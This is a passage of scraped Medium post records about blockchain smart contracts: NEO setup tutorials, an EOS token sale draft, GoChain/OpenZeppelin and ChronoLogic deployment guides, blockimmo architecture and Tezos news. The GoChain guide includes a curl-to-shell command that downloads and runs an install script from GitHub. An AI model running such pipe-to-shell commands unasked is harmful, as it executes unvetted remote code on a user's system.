"https://medium.com/coinmonks/neo-smart-contract-development-tutorial-the-beginning-c54ea748ce77?source=search_post", "post_date": "May 14, 2018", "readtime": "3 min read", "upvotes": "10", "content": "Neo Smart Contract Development Tutorial - The BeginningNeo smart Contract development from scratch, from installing\u00a0.net, setting up visual Studio to creating smart contract and testing\u00a0themGaurav AgrawalBlockedUnblockFollowFollowingMay 14, 2018sourceCreate Crypto\u00a0InvoicesCryptofi\u200a\u2014\u200aCreate Crypto Invoices, track your Crypto paymentsFind crypto jobs using Coinmonks jobs portalDonate to CoinmonksClick to find blockchain JobsAttribution\u200a\u2014\u200aThis series is republished work of Michael Herman (Toronto) from his Git Repository. All claps and Praise goes to him.PurposeThe purpose of this Series is to enable\u00a0.NET developers who are brand new to NEO Blockchain technology to create a useful NEO development environment and get it up and running in as little time as possible.This document is specifically targeted at\u00a0.NET developers and architects.CaveatIn addition, when the first version of the document was written (February 2018), you will also need to have an early adopters mind set. It\u2019s the early days. You\u2019ll be downloading the code for most of the developer tools (aside from Visual Studio) and compiling them yourself. It may not always be fun but I promise it will certainly be rewarding in the end.GoalsEnsure you have a working and properly configured NEO development environment up and running in as short a time as possibleEnable to create, deploy and test your first NEO smart contract written in C# (using the HelloWorld sample)PrinciplesProvide reliable documentation: timely, accurate, visual, and completeSave as much of a person\u2019s time as possibleUse open source software whenever possibleDriversNeed in the NEO\u00a0.NET developer community to have concise and easy-to-follow documentation to enable people to get up to speed developing NEO smart contracts in as short a time as possiblePre-requisites and RecommendationsDownload and install Visual Studio 2017 Community Edition integrated development environment (IDE)Download and unpack NEO developer tool projects (source)Install NeoContractPlugin Visual Studio extensionBuild and test NEO developer tool projects (from source)Download, install, and test Docker platformDownload and test NEO privatenet Docker containerCreate and compile HelloWorld smart contract sampleDeploy and test the HelloWorld smart contractCelebrateQuick Cycle Edit-Compile-Debugging of C#.NEO Smart ContractsI didn\u2019t republish Below Three Pieces, You should checkout them On Michael\u2019s Git Repository.Appendix A\u200a\u2014\u200aChecklistAppendix B\u200a\u2014\u200aRoadmapAppendix C\u200a\u2014\u200aReset NEO privatenet Environment: Container, Wallets, and ClientsGo To Part 1\u200a\u2014\u200aPre-requisites and Recommendations", "responses": ""}, {"title": "Draft EOS Token Sale Smart\u00a0Contract", "author_name": "eosio", "link": "https://medium.com/eosio/draft-eos-token-sale-smart-contract-3e10954f2364?source=search_post", "post_date": "Feb 7, 2018", "readtime": "2 min read", "upvotes": "54", "content": "Draft EOS Token Sale Smart\u00a0ContracteosioBlockedUnblockFollowFollowingFeb 7, 2018Originally published on steemit.com on 10 June 2017.Dear EOSIO Community,Today block.one is happy to share a first draft of our upcoming token distribution smart contract.(\u201cEOS\u201d) Tokens will be distributed as an ERC-20 compatible token on the Ethereum blockchain. The repository containing the EOS Token Sale smart contract can be found at https://github.com/eosio/eos-token-sale.We will be conducting a 2 week public trial run of the sale on the Ethereum test network. We welcome anyone interested in learning how the sale works to participate in the trial. A follow up email will be sent with instructions on how to participate in this trial when we deploy the trial contract to the test network.Please note that no information regarding the final terms and timing of the sale is being released at this time; everything released today is subject to change and provided for information and feedback purposes only.", "responses": "1"}, {"title": "The Easiest Way to Deploy OpenZeppelin Smart Contracts\u200a\u2014\u200ano Truffle required!", "author_name": "Travis Reeder", "link": "https://medium.com/gochain/the-easiest-way-to-deploy-an-openzeppelin-smart-contract-no-truffle-required-d248d4c3835a?source=search_post", "post_date": "Feb 19", "readtime": "3 min read", "upvotes": "152", "content": "The Easiest Way to Deploy OpenZeppelin Smart Contracts\u200a\u2014\u200ano Truffle required!Travis ReederBlockedUnblockFollowFollowingFeb 19If you\u2019ve deployed a smart contract like an ERC-20 token contract or ERC-721 non-fungible token contract, then you may have used OpenZeppelin\u2019s great open source smart contracts to do it. They\u2019ve been audited and battle-tested in the real world so if you aren\u2019t using them to do your contracts, you probably should be.The problem is that you probably used Truffle Framework to build and deploy the contracts since that\u2019s what it says to use in their docs. Well let me tell you before you start pulling your hair out, there is a much easier way! No config files and no JavaScript (who thought that was a good idea?) required!Deploy an ERC-20 Contract in 2\u00a0MinutesFirst, install the web3 command line tool which you\u2019ll use throughout this article:curl -LSs https://raw.githubusercontent.com/gochain-io/web3/master/install.sh | shThe following is a simple ERC20 contract using OpenZeppelin. Copy the code and paste into a file called token.sol:Get the OpenZeppelin libraries. In the same directory as token.sol, run:git clone --depth 1 --branch master https://github.com/OpenZeppelin/openzeppelin-solidity lib/ozrm -rf lib/oz/.gitNow build your contract.web3 contract build token.solThis will compile your contract and generate two files: CappedToken.bin and CappedToken.abi.Let\u2019s deploy it to a local node to test it out first. Start a local GoChain node for development (remember this is 100% Ethereum compatible so you can still use this for testing even if you plan to deploy to Ethereum later).web3 startThis will start a GoChain node, automatically generate a new private key for you, and fund it with GO. You can then use that private key to deploy and use your node immediately. Copy the private key from the output and use that in the export below:export WEB3_NETWORK=localhostexport WEB3_PRIVATE_KEY=[YOUR PRIVATE KEY]Deploy the contract:web3 contract deploy CappedToken.binBoom! It\u2019s deployed. Easy huh? This will return the address of your contract. Copy the address and run:export WEB3_ADDRESS=[CONTRACT_ADDRESS]Now you can interact with your contract. Since this is an ERC-20 contract, let\u2019s mint some tokens for yourself and then transfer some of those to another address.web3 contract call --abi CappedToken.abi --function mint $(web3 myaddress) 1000000000000000000000Now we can check our balance to make sure it worked.web3 contract call --abi CappedToken.abi --function balanceOf $(web3 myaddress)That should return: \u201cCall results: 1000000000000000000000\u201d. which means you have 1000 tokens! (1000* 10\u00b9\u2078, ERC-20 contracts typically use 18 decimal places so the number look pretty massive).To transfer to another account, let\u2019s first create a second account:web3 account createCopy the public address that returns then call:web3 contract call --abi CappedToken.abi --function transfer [NEW_ADDRESS] 1000000000000000000Now you can check your balance again and see that it went down and check the balance of the new account to see that there\u2019s went up. Boom.Ready for ProductionBuy some GO to deploy to GoChain or ETH to deploy to Ethereum. Then set your network and your private key that has the real GO or ETH.Deploy to GoChain:export WEB3_NETWORK=gochainexport WEB3_PRIVATE_KEY=[YOUR GOCHAIN PRIVATE KEY]web3 contract deploy CappedToken.binOr deploy to Ethereum:export WEB3_NETWORK=ethereumexport WEB3_PRIVATE_KEY=[YOUR ETHEREUM PRIVATE KEY]web3 contract deploy CappedToken.binYou are now officially a DApp developerNo matter what your contract does, you can follow the same process to deploy and interact with it. Let us know what you think or how we can make the web3 tool better!", "responses": ""}, {"title": "How to use ChronoLogic\u2019s \u201cDebt Smart Contract \u201c dAPP -\u00a0Guide", "author_name": "ChronoLogic", "link": "https://medium.com/@chronologicnetwork/how-to-use-chronos-debt-smart-contract-dapp-guide-94e416524d32?source=search_post", "post_date": "Jan 26, 2018", "readtime": "6 min read", "upvotes": "76", "content": "How to use ChronoLogic\u2019s \u201cDebt Smart Contract \u201c dAPP -\u00a0GuideChronoLogicBlockedUnblockFollowFollowingJan 26, 2018DISCLAIMER: The Debt Smart Contract is in working condition on the Ethereum MainNet, feel free to use it or to build on it, but note that it\u2019s not being currently actively maintained. Please, also, understand that most of the exciting development work done by ChronoLogic is focused on the Ethereum Alarm Clock.This is one of the tools offered via ChronoLogic\u2019s dAPP (A Decentralized App orchestrating services and technologies to create debt & innovative time-based smart contracts) operating as a mediator between the two parties of a loan agreement.The app is accessible for public testing via the following link:Below you can find a guide, explaining Step by Step the usage of Debt Smart Contract (It is very easy to operate it and it is not limited to developers or user with technical / coding background:Please note that ChronoLogic\u2019s dAPP is accessible only with MetaMask extension at this point. In order to get started you need to download either the Google Chrome extension or download the Brave Browser. MetaMask allows you to run Ethereum dApps right in your browser without running a full Ethereum node.You can Download Brave Browser here or the Chrome extension from this link.Until the dApp will be available in Ethereum Mainnet\u2019s Network, we strongly recommend you to familiarize yourself with our dAPP, within Ropsten Network, so you will avoid spending any amount of Ether for this.(Make sure to select the Ropsten Test Net, among the list of available networks, from the upper-left side of MetaMask extension)As soon you will register for a MetaMask account, make sure you will save securely the seed phrase, so you can restore anytime later your account, in case needed! For those, who will download for first time the MetaMask extension, your wallet will be empty, but you can ask for TESTNET Ether for free from the Faucet Network.Test Ether FaucetEdit descriptionfaucet.metamask.ioFor that, click \u201crequest 1 ether from faucet\u201d and then scroll down if you want to check the txHash for this transaction. As soon you will view the available 1 Ether to your MetaMask wallet, we are able to start operating this ChronoLogic\u2019s dAPP.Among the first steps is to receive a notification that the dApp is now connected to Testnet. Just click \u201cOK\u201d.Before clicking the Start button, make sure to request your free TestNet Day tokens. A message with the Token Faucet request Status, will appear immediately.After this step, we are able to start our Debt Smart Contract.Part 1\u200a\u2014\u200aDebt Smart Contract\u00a0CreationIn the first page you need to complete Token Name and Token Symbol, which you are free to choose your own related to the scope and aim of the contract. Just for this guide,we have used the Token Name\u00a0: Swift and our Token Symbol will be\u00a0: SWIFT\u00a0. Once you have filled these fields properly, click \u201cCONTINUE\u201d.The next page is where you should indicate all the interest rate parameters for the creation of your own unique debt smart-contract.Through this screen you will be requested to complete the following information:Interest Rate per Cycle\u00a0: The rate at which Interest accrues per cycle (%)Interest Cycle in Days: Length of each Interest cycle (Days)Loan Maturity Length in Days: Number of Days for Loan MaturityDay Length in seconds: Number of seconds in a Day (sec) Please note that we are currently updating our UX/UI design and we will interpret DAY as a Period, so it will be easier understandable from the wide audience.After you set those parameters, please click the CONTINUE button, to proceed with your Debt Smart Contract.Currently, the mechanism doesn\u2019t support a collateral. When we progress the development and collateral being accepted then we will have a trustful smart contract, could be used for real lending cases.This step is critical, since here we provide with all the important elements of our contract.Lender Address: Ethereum Address of the LenderEther Amount: Loan Ether Amount (ETH)Exchange Rate: Number of Debt Tokens to be generated per EtherThen click Continue, to proceed to the next step.Please verify that the provided details listed to this screen are correct, before proceeding with the Deployment of your smart contract. Warning: This is the final step, you are able to revise all the data you input to the dApp and check if that\u2019s really what you want to deploy. A mistake here, when ChronoLogic\u2019s dAPP is being used to Ethereum Mainnet will cost you both DAY tokens and ETH gas.When you click the DEPLOY button, MetaMask extension will prompt you to submit a transaction, which will basically create your customized DAY token smart contract, one with all the parameters you just inserted on the dApp.Finally, when you will successfully DEPLOY your contract, a screen accessing contract\u2019s detail will appear soon.By successfully deploying the contract as soon you click the \u201cSUBMIT\u201d button on MetaMask, the dApp will give you a Transaction Hash (txHash), which might take some time to be actually confirmed by the network. Clicking on the link provided you\u2019ll be able to check its progress.Part 2\u200a\u2014\u200aFunding the Smart\u00a0ContractWhen the Debt Smart Contract is successfully deployed, then the Lender must login in order to fund the loan. For the login, the lender needs TxHash or Contract Address.Then, by clicking the button FUND, he needs to click the button SUBMIT from his METAMASK extension.Congratulations! At this stage, the lender has successfully concluded with funding the loan.It\u2019s time now for borrower to pay back the loan with the agreed interest rate.Both the lender and borrower can update the interest rate. A success notification, will appear immediately, as soon you will click the Submit button from your MetaMask extension.With the same way a borrower can login and REFUND the loan.Important: Please note that everybody who has the TxHash or contract address is able to view the transaction and progress of loan repayment between the two parties, as we did in a transaction we didn\u2019t have borrowers or lenders rights. Of course, a third party is unable to proceed with any changes to the agreed contract.Keep an eye out on our Blog for the upcoming releases!", "responses": ""}, {"title": "Publishing Your First Smart Contract on\u00a0IOST", "author_name": "IOS Foundation", "link": "https://medium.com/iost/publishing-your-first-smart-contract-on-iost-d2a7accbfbb2?source=search_post", "post_date": "Mar 18", "readtime": "5 min read", "upvotes": "105", "content": "Publishing Your First Smart Contract on\u00a0IOSTIOS FoundationBlockedUnblockFollowFollowingMar 18This article on publishing your first smart contract on IOST was selected from the IOST Tech Article Contest. We are welcoming all community developers to share with us their experiences, views on IOST and blockchain. Selected articles will be shared across all IOST channels and platforms. Authors will be rewarded with bounties once the article is selected!Below is a guide on how to build a smart contract and publishing it via the command line on IOST. This guide is for developers interested in creating an IOST smart contract using JavaScript. Before we dive into coding, let\u2019s look at into the basics of Decentralized Applications (DApps), along with evaluating what smart contracts are used for.", "responses": ""}, {"title": "A simple layer enabling a smart contract based web\u00a0app", "author_name": "Michael Dietz", "link": "https://medium.com/blockimmo/a-simple-layer-enabling-a-smart-contract-based-web-app-691f0b64c475?source=search_post", "post_date": "Apr 23, 2018", "readtime": "5 min read", "upvotes": "13", "content": "A simple layer enabling a smart contract based web\u00a0appMichael DietzBlockedUnblockFollowFollowingApr 23, 2018In a previous post I introduced the core/foundational layer of blockimmo\u200a\u2014\u200aour smart contracts. Mission-critical state and functionality live on-chain, encapsulated by these contracts. The rights/ownership to a plot of land is an example of on-chain state. The exchange/transfer of these rights/ownership is an example of on-chain functionality.Our approach is to integrate seamlessly with the existing processes and systems powering the Swiss real-estate market, offloading bottlenecks/critical components on-chain. Playing to its strengths, while simplifying and streamlining where most effective, to enable a more efficient and robust market.The smart contracts powering blockimmoblockimmo is a secure, simple platform for buying, selling, and investing in Swiss \ud83c\udde8\ud83c\udded real-estate. By migrating\u2026medium.comThis post focuses on the interface between our contracts (living on the Ethereum blockchain) and our frontend/users. This layer enables easy, secure blockchain interaction, and seamless integration with our frontend. The result is an intuitive UI/UX for our users to buy, sell, and invest in Swiss \ud83c\udde8\ud83c\udded real-estate.blockimmo platform\u200a\u2014\u200athe 3 major\u00a0layersOur general user should not care about blockchain, or any other parts of our software stack. In the same way nobody cares about what happens under-the-hood when they do an online bank transaction. We aim to facilitate the interaction between our users and smart contracts at a reasonable level of abstraction.With a browser, the power of the internet is at a user\u2019s fingertips. With a \u00d0App, blockchain is. From here only a very basic understanding of the technology is required (i.e. web addresses in the internet world, public addresses in the blockchain world, and a few other concepts). Both the internet and blockchain user must always take caution though. And since blockchain users haven\u2019t built an intuition for safety yet, we need to hold their hand a bit to ensure they don\u2019t stray off the beaten path.A first-principles approach to\u00a0stateOnly the most fundamental state is stored on-chain. One such example is a property\u2019s E-Grid (Eidgen\u00f6ssische Grundst\u00fccksidentifikation\u200a\u2014\u200aa universally unique identifier). By storing this (immutable) state, we can retrieve any other information related to a property dynamically/lazily (instead of explicitly maintaining/storing it) through existing, standard systems. This (functional) approach greatly simplifies and leads to a more resilient, robust platform. The end result is a smooth user-experience.Calls (reads) vs. transactions (writes)We aim to facilitate the interaction between our users and smart contracts at a reasonable level of abstraction.Users interact with our smart contracts in two ways: performing calls (reads) and transactions (writes). Calls are cheap, instant, and completely abstracted from the user\u200a\u2014\u200athey happen in the background without any user intervention required. Just like reading from any normal database. By establishing a connection to a public Ethereum node (i.e. via the Infura API) a client isn\u2019t required to run a node themselves.Transactions are expensive\u200a\u2014\u200athey must be signed by the user with their private key(s), and then mined by the network (slow). This has two major implications: (1) blockimmo must provide users with an easy, secure way to sign transactions, and (2) these operations should be performed only when absolutely necessary.Our first-principles approach to state puts us in a good position for (2). Because only the most fundamental state is stored on-chain, transactions occur rarely and are only performed when a user lists a property for-sale, or buys/invests. This small surface area allows us to really focus on an intuitive UI/UX around these processes to ensure the user fully understands what is being signed and complete transparency.This leads us to (1). Instead of reinventing the wheel we rely on MetaMask\u200a\u2014\u200aprobably the most solid, well-tested solution enabling our users to review and sign blockchain transactions in-app.Transactions are the weak link in the chain when it comes to building a secure \u00d0App. While blockchains have been proven to be extremely secure, and we can develop secure, audited smart contracts, if an attacker tricks a user into signing a spoofed transaction (i.e. sending funds to a different address), or steals a user\u2019s private key(s), all this security doesn\u2019t matter. It is our job to make these kind of attacks as difficult/impractical as possible. Making transactions end-to-end secure is the major driving factor in our approaches to (1) and (2).MetaMaskhttps://metamask.io/We\u2019ve identified MetaMask as the best default wallet for reviewing and signing transactions in-app. Users are not required to install the MetaMask Chrome/Firefox extension for browsing (performing calls/read-only) or buying/investing (optional here as explained in the coming sections). MetaMask is only required when listing a property for-sale\u00a0. During this process we tokenize the property and deploy the smart contracts around/attached to it (i.e. the ShareholderDAO and TokenSale), and MetaMask integrates best with our UI/UX to make this process easy and intuitive for the seller.It is important to note that MetaMask is a hot wallet\u200a\u2014\u200ait lives on an internet connected device. If an attacker has full access to a user\u2019s computer and MetaMask (either unlocked or the attacker also has the user\u2019s vault\u2019s password) then that user would be compromised. However, a TokenizedProperty has no real value until it is verified in the LandRegistry by blockimmo. If anything goes wrong up until this point, the entire listing process can be reverted without harm. This ensures a safe, fool-proof listing process for sellers, and guarantees a property\u2019s legitimacy for buyers/investors.Once a TokenSale is live, blockimmo has verified the TokenizedProperty in the LandRegistry. An attacker would gain nothing from having access to a seller\u2019s private keys (used to list the property) at this point. This is because when configuring a TokenSale, the seller provides a public address (hardware wallet recommended) where raised funds (and/or any unsold tokens) are transferred upon completion of the TokenSale. This wallet is verified to be in the seller\u2019s control by blockimmo in the listing\u2019s verification process.Wallet agnostic\u200a\u2014\u200ahardware wallets supported and encouragedInvesting in a property (buying tokens via a TokenSale) is simply sending ETH to the TokenSale smart contract in exchange for tokens of the property. This is easily accomplished in-app via MetaMask, or out-of-band via any software/hardware wallet.When exchanging value (verified tokens of property and/or ETH) we recommend using hardware wallets. We developed our smart contracts from the ground-up to enable seamless use of hardware wallets. In the near-future hardware wallets will be supported in MetaMask and our solution will become even simpler!An intro to our\u00a0web-appSo far we\u2019ve introduced our smart contracts and how we interact with them. In our next post we will tie everything together to introduce our web-app!", "responses": ""}, {"title": "Tezos: Grants for Block Explorers and Smart Contract Languages, Two New Features for the Node - Snapshots and History Modes, Go Tezos Major Release v1.0.0, LIGO becomes Polyglot, More TezTalks\u00a0Videos", "author_name": "Paradigm", "link": "https://medium.com/paradigm-fund/tezos-grants-for-block-explorers-and-smart-contract-languages-two-new-features-for-the-node-7cdf4030c39d?source=search_post", "post_date": "May 9", "readtime": "13 min read", "upvotes": "69", "content": "Tezos: Grants for Block Explorers and Smart Contract Languages, Two New Features for the Node - Snapshots and History Modes, Go Tezos Major Release v1.0.0, LIGO becomes Polyglot, More TezTalks\u00a0VideosParadigmBlockedUnblockFollowFollowingMay 9Biweekly update 26th April\u200a\u2014\u200a10th MaySince the launch of the Mainnet six months ago, the Tezos community has seen a brand new baking industry emerge, thousands of peers securing the network, the first amendment proposal, etc. During these two weeks, developers were working hard as usual and a lot of news appeared. Go Tezos\u200a\u2014\u200aa GoLang driven library for your Tezos node released. Nomadic Labs demonstrated \u2018snapshotting\u2019 which will enable you to sync a full Tezos node with 1\u20132 minutes. Tezos Foundation announced they will support grants for Block Explorers and smart contract languages for Tezos Ecosystem. Tezzigator Receives Grant To Expand Cloud HSM Support For Tezos Bakers. Tezos Korea partners with Konkuk University to create a Tezos focused blockchain course for Master degree. They will also open the Tezos focused blockchain course at Samsung Multicampus. Bitcoin Suisse, located in Zug and one of the main crypto providers in Switzerland, plans to offer Tezos baking services to their clients. Brian Guo, an intern at TQ, launched Michelson Execution Engine. This project will assist in separating and modularizing the individual components of the codebase. Bruce Aldrich (DNAG), launched \u2018Payman\u2019, a Tezos batch payment tool for bakers using a golang Tezos library. Payman will make it easier for bakers to distribute batch payments to delegations. Gabriel Alfour provided an update on how the LIGO smart contract language for Tezos is becoming more accessible. As for social encounters, we would like to start off by acknowledging Tezos \u2018100th\u2019 Cycle, an absolutely incredible feat for the network, the community, and the broad Tezos ecosystem. The community witnessed a great month for April with events across the globe including a couple of inaugural events for new regions that boasted better than expected attendance. Tezos Boston hosted Kathleen & Arthur, Tezos Vienna had its first meetup hosted by Tezos community developer, Matej. We also saw the first pilot of Tezos on the Road in Brussels, a hands on workshop where attendees setup their own Tezos node. Tezos had its first premier conference in Paris thanks to TQ organizing. As for upcoming events, Tezos community looks forward to the next TQuorum happening in New York. Tezos Commons will sponsor BuidlBoston Hackathon, teams will compete for 10K XTZ during Boston Blockchain Week. Not to mention, the future for Tezos is just as bright with upcoming amendments involving zk-Snarks, Tendermint, and Marigold. Stay tuned!Bake your Tezzies with us\u200a\u2014\u200atezocracy.comDevelopmentGitlab metricsDeveloper activity (from Coinlib.io)Supporting The Development Of Block Explorers And Smart Contract Languages For The Tezos Ecosystem:To increase accessibility and spur more open source innovation in the Tezos ecosystem, the Tezos Foundation announced a new area of focus for the near future: supporting the development of additional open source block explorers and smart contract programming languages.These tools are critical public infrastructure for those building on and using Tezos and the Tezos Foundation thinks they\u2019re important to provide additional stability and product diversity for the community.Block ExplorersIn the months to come, they will fund the long-term development and maintenance of several open source block explorers, giving developers, wallet providers, and others access to a greater set of options to analyze and gather information about the Tezos blockchain.They will encourage everyone developing these block explorers to collaborate on common standards to ensure the community has the most useful and accessible tools. This collaboration will include: API standards so bakers and other relying parties can query a block explorer and receive consistently formatted data; open source code and quality packaging to allow third parties to run their own public instances of block explorers; and operations and monitoring systems to ensure block explorers reliably provide accurate information.The development of additional block explorers is already underway. Tezos.ID, a project from Tezos Southeast Asia, has been in operation since June 2017 and is expanding in functionality. Arronax, a project from Cryptonomic, is an analysis-focused block explorer that uses the Conseil API. They are currently in talks with OCamlPro, the developer of TzScan, to provide maintenance funding past its end-of-Q2 grant expiration. These projects, as well as new ones the Tezos Foundation will funds in the coming months, will establish a robust network of block explorers for the Tezos community to utilize.Smart Contract LanguagesSimilarly, supporting the creation of new smart contract languages, which enables more developers to seamlessly build on Tezos, continues to be a primary focus of the Foundation. Their objective is to have wide language coverage, which will allow a larger audience of developers to more easily build on Tezos.Some of this has already started. In addition to several open source high-level language projects, like SmartPy and fi, that have already received funding from the Foundation, Nomadic Labs will continue to work on Michelson, a domain-specific language for writing smart contracts on Tezos, as well as an additional low-level language, Albert, which will serve as a compilation target for other high-level languages. The development team behind LIGO, a simple language designed for relatively large smart contracts, recently announced that the LIGO compiler is equipped to integrate additional syntaxes for LIGO. Currently supported syntaxes are Pascaligo (Pascal-like syntax) and Cameligo (OCaml-like syntax).Criteria for projects focused on building block explorers and languages to receive funding from the Foundation will be announced in the coming weeks. A full list of those selected as grant recipients for these projects will be announced. Stay tuned for more information.Tezzigator Receives Grant To Expand Cloud HSM Support For Tezos\u00a0Bakers:The Tezos Foundation announced that it has issued a grant to Tezzigator LLC to implement Microsoft Azure and Google Cloud HSM support for Tezos bakers.Hardware Security Modules (HSMs) are physical devices that manage cryptographic keys for greater security. They may be used by Tezos bakers for validation, however, cloud HSM support for Tezos bakers was previously only available via Amazon Web Services. With this grant, the Tezzigator team will make cloud HSMs more accessible to Tezos bakers by enabling support on Microsoft Azure and Google Cloud.The repo for Microsoft Azure support is open-source and available for public use here. The repo for Google Cloud support is open-source and available for public use here.The Tezos Foundation\u2019s core mission is to support the long-term success of the Tezos protocol and ecosystem. By funding projects imagined by scientists, researchers, developers, entrepreneurs, and enthusiasts, the Foundation encourages decentralized development and robust participation.Go Tezos Major Release v1.0.0, A GoLang Tezos\u00a0Library:Go Tezos is a GoLang driven library for your Tezos node. Go Tezos is split into multiple services underneath to help organize it\u2019s functionality and also makes the library easier to maintain.Introducing Snapshots and History Modes for the Tezos\u00a0NodeIn this article, the Nomadic Labs team introduces two new features for the Tezos node: snapshots and history modes.A snapshot is a file that contains everything necessary to restore the state of a node at a given block. A node restored via a snapshot can synchronise and help other nodes synchronise in the existing network. The only difference is that you cannot query the chain context (balances, baking rights, etc.) before the restoration point, but you can still get the full chain history.In conjunction, the team also introduces history modes, which represent different policies for determining which past data a node should maintain. They propose three modes: archive (the current mode which keeps everything), full (the new default) and rolling. For now, snapshots can fire up a node in either full or rolling mode.These new features allow a user to spawn and synchronise a Tezos node in a few minutes, from a single, untrusted file of about 150MB compressed with a truncated history, or 800MB with a full history. You can test all of that by using the mainnet-snapshots branch on Nomadic Labs\u2019 Gitlab.", "responses": ""}, {"title": "", "author_name": "300cubits.tech", "link": "https://medium.com/@300cubits/teu-ecosystem-smart-contract-live-shipment-trial-explained-7e363556cb6f?source=search_post", "post_date": "Apr 6, 2018", "readtime": "3 min read", "upvotes": "28", "content": "TEU Ecosystem Smart Contract Live Shipment Trial Explained300cubits.techBlockedUnblockFollowFollowingApr 6, 2018", "responses": "1"}, {"title": "How does a smart contract\u00a0work?", "author_name": "Good Rebels", "link": "https://medium.com/@goodrebels/how-does-a-smart-contract-work-2ec0a3d46bdb?source=search_post", "post_date": "Jun 1, 2017", "readtime": "2 min read", "upvotes": "5", "content": "How does a smart contract\u00a0work?Good RebelsBlockedUnblockFollowFollowingJun 1, 2017At Rebel Thinking, we have already talked about blockchain, the technology that promises to revolutionize the way value gets exchanged in a variety of sectors. Blockchain performs transactions under P2P protocols and cryptographic techniques in a secure and transparent way, on a model of distributed interaction that displaces traditional intermediaries and eradicates control coming from a central authority.Smart contracts are nothing more than the codification of orders that get executed on a blockchain, and on which so-called Dapps work. Through programming languages like Solidity or Serpent, smart contracts can only use objective parameters (all nodes must be able to calculate any employed variable). Once the predetermined conditions are completed, the smart contract automatically executes itself on a public blockchain (primarily Ethereum, although Bitcoin is on its way towards accepting smart contracts).To guarantee the sustenance of the entire Dapps and smart contracts ecosystem, any execution of orders on a blockchain involves spending cryptocurrency. This cost, called Gas, depends on the operations the smart contract aims to perform and serves as a financial incentive for the network to not get saturated, while it maintains the nodes needed to ensure a permanent and secure service.Dapps will ultimately allow for interaction with the so-called Decentralized Autonomous Organizations (or DAOs), algorithms that self-manage common interests through smart contracts.The applications for smart contracts are immense. The following infographic represents the sequence of the purchase and sale of a piece of real estate using a smart contract, a pioneering project put into practice in Sweden in June 2016.___________________________________________________________________For more about blockchain, read the study \u201cBlockchain: building trust\u201d from Rebel Thinking.", "responses": ""}, {"title": "Kaiko and Chainlink Present: Smart Contract and Decentralized Oracle\u00a0Demo", "author_name": "Kaiko", "link": "https://medium.com/@kaikodata/kaiko-and-chainlink-present-smart-contract-and-decentralized-oracle-demo-deeb4087d607?source=search_post", "post_date": "Feb 8", "readtime": "2 min read", "upvotes": "198", "content": "Kaiko and Chainlink Present: Smart Contract and Decentralized Oracle\u00a0DemoKaikoBlockedUnblockFollowFollowingFeb 8Are you attending EthCC in Paris this March? To kick off the week, Kaiko will be co-hosting an event with Chainlink at our shared offices with Consensys on March 4. Stop by to socialize, network, and of course, learn about smart contracts and decentralized oracles.Event Description:Smart contracts require external data if they\u2019re to solve the important problems that go beyond tokenization. In this demo, you\u2019ll learn how to connect a smart contract to external, off-chain data using Chainlink\u2019s decentralized oracle network. We\u2019ll start by creating a Chainlink smart contract that requests cryptocurrency market data from Kaiko. Then we\u2019ll feed that data into a smart contract to automatically trigger transactions based on crypto fiat prices.Speakers:Ambre Soubiran is the CEO of Kaiko, an institutional digital assets data provider. She first became interested in cryptocurrencies in 2013, and has since invested in a number of start-ups in the space. She is also a founding member of the CollectiveFuture, a group of tech leaders working to foster diversity in blockchain and cryptoassets. Ambre hopes to improve transparency in the cryptoassets space through the provision of high-quality market data.Sergey Nazarov is the CEO of Chainlink. He joined the blockchain space in 2011 and built some of the first decentralized applications in 2013 (Cryptamail and Secure Asset Exchange). He\u2019s currently working to solve the \u201coracle problem\u201d by providing smart contracts with the inputs and outputs they need to effectively interface with external data sources.Thomas Hodges is a Developer Evangelist and Integration Engineer at Chainlink. He helps developers around the world unlock the potential of smart contracts using the Chainlink network.Register for the event here: https://www.meetup.com/Kaiko-Paris-Cryptocurrency-and-Blockchain-Meetup/events/258757355/?isFirstPublish=true", "responses": ""}, {"title": "Neo Smart Contract Development -Part\u00a09", "author_name": "Gaurav Agrawal", "link": "https://medium.com/coinmonks/neo-smart-contract-development-part-9-5c36b765014d?source=search_post", "post_date": "May 14, 2018", "readtime": "12 min read", "upvotes": "6", "content": "Neo Smart Contract Development -Part\u00a09Deploy and test HelloWorld smart\u00a0contractGaurav AgrawalBlockedUnblockFollowFollowingMay 14, 2018Create Crypto\u00a0InvoicesCryptofi\u200a\u2014\u200aCreate Crypto Invoices, track your Crypto paymentsFind crypto jobs using Coinmonks jobs portalDonate to CoinmonksClick to find blockchain JobsPurposeThe purpose of this activity is to use deploy and test the HelloWorld smart contract created in the previous activity. It uses the the neo-gui-developer tool that was build in an earlier activity. This activity also uses the NEO Docker container that was installed and configured also in an earlier activity.Goals, Non-Goals and AssumptionsEnsure you have a working and properly configured set of NEO developer tools for creating and building smart contracts in Visual Studio with the C# programming languagePrinciplesProvide reliable documentation: timely, accurate, visual, and completeSave as much of a person\u2019s time as possibleUse open source software whenever possibleDriversNeed in the NEO\u00a0.NET developer community to have concise and easy-to-follow documentation to enable people to get up to speed developing NEO smart contracts in as short a time as possibleStart (reset) the NEO privatenet Docker containerStart the NEO privatenet Docker container by opening PowerShell and running the following commands:docker container listdocker stop neo-privnet-with-gasdocker container listdocker rm neo-privnet-with-gasdocker container listdocker run -d --name neo-privnet-with-gas -p 20333-20336:20333-20336/tcp -p 30333-30336:30333-30336/tcp metachris/neo-privnet-with-gasdocker container listpauseScript: NEO Docker Reset (./scripts/neodockerreset.bat.txt)The script produces the following output:Figure 9.1. NEO Docker\u00a0ResetTest the NEO privatenet Docker Container2. To test the NEO Docker container, run following script:REM cd opt/neo-pythonREM python3 prompt.py -pREM block 0docker exec -it neo-privnet-with-gas /bin/bashpauseScript: NEO Docker Python CLI/Shell (./scripts/neodockerpshell.bat.txt)When the bash shell starts, enter the following commands:cd opt/neo-pythonpython3 prompt.py -pblock 0Configure neo-gui (developer) to use the NEO privatenet Docker container3. Open Windows Explorer and navigate to C:\\NEO\\neo-gui-developer\\neo-gui\\bin and right-click on the the Debugfolder and delete it (and all of of the folder's contents).Figure 9.2. C:\\NEO\\neo-gui-developer\\neo-gui\\bin4. Navigate to C:\\NEO\\neo-gui-developer.Figure 9.3. C:\\NEO\\neo-gui-developer5. Double-click neo-gui.sln to open the neo-gui-developer project in Visual Studio.Figure 9.4. Visual Studio: neo-gui\u00a0project6. In Visual Studio, replace the contents of config.json with the contents of config.neodocker.json.Figure 9.5. Visual Studio: config.jsonNOTE: If config.neodocker.json is not part of your project, you can download it from here(./json/config.neodocker.json) and place it in the C:\\NEO\\neo-gui-developer\\neo-gui folder. Right-click on the neo-gui project folder in Visual Studio and select Add > Existing Item... > *.*. Select config.neodocker.json and click 